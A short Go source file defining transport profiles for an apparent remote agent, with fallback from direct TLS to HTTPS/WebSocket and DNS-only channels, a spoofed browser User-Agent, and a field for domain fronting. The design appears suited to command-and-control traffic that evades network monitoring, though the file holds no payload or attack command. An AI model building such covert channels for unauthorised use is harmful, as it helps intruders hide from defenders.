package transport

import (
	"crypto/tls"
	"net"
)

// Profile defines a transport profile for an agent.
type Profile struct {
	Name       string   `json:"name"`       // e.g., "corporate", "direct"
	Priority   int      `json:"priority"`   // Lower = tried first
	Transports []string `json:"transports"` // e.g., ["wss", "https", "dns"]
	ProxyURL   string   `json:"proxy_url"`  // Optional SOCKS5/HTTP proxy
	UserAgent  string   `json:"user_agent"` // e.g., "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
	HostHeader string   `json:"host_header"` // Domain fronting header
	MaxRetries int      `json:"max_retries"`
}

// Conn wraps a network connection with transport metadata.
type Conn struct {
	net.Conn
	Transport  string
	TLSEnabled bool
	TLSState   *tls.ConnectionState
	ProxyUsed  bool
}

// WrapConn creates a Conn wrapper.
func WrapConn(conn net.Conn, transport string) *Conn {
	return &Conn{
		Conn:      conn,
		Transport: transport,
	}
}

// WrapTLSConn creates a TLS-wrapped Conn.
func WrapTLSConn(conn *tls.Conn, transport string) *Conn {
	state := conn.ConnectionState()
	return &Conn{
		Conn:       conn,
		Transport:  transport,
		TLSEnabled: true,
		TLSState:   &state,
	}
}

// DefaultProfiles returns standard transport profiles.
func DefaultProfiles(serverAddr string) []Profile {
	return []Profile{
		{
			Name:       "direct",
			Priority:   1,
			Transports: []string{"tcp+tls", "tcp"},
			MaxRetries: 3,
		},
		{
			Name:       "corporate",
			Priority:   2,
			Transports: []string{"wss", "https", "dns"},
			UserAgent:  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
			MaxRetries: 5,
		},
		{
			Name:       "restricted",
			Priority:   3,
			Transports: []string{"dns"},
			MaxRetries: 10,
		},
	}
}
